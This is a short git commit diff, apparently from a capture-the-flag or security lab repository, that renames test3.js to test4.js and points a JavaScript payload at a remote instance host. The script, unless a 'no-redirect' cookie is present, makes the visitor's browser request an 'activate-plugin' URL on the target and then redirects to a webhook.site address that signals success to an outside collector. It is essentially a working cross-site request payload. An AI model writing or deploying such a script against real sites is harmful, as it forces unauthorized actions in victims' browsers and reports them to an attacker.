cd849819a2cdef61ef61ea32abc8780fbc3336da
PlutoniumBot <143269390+PlutoniumBot@users.noreply.github.com>
2023-11-19 11:08:38 +0100

    Update and rename test3.js to test4.js

--- test4.js
+++ test4.js
@@ -1,5 +1,5 @@
 if(!document.cookie.includes("no-redirect")){
-    fetch('http://localhost/activate-plugin/1')
+    fetch('http://website-lqrhjc.inst.malicecyber.com/activate-plugin/1')
         .then((e) => {
             document.location.href = 'https://webhook.site/949ccc25-e06d-46a8-804c-899b79bec444?plugin-good';
         })
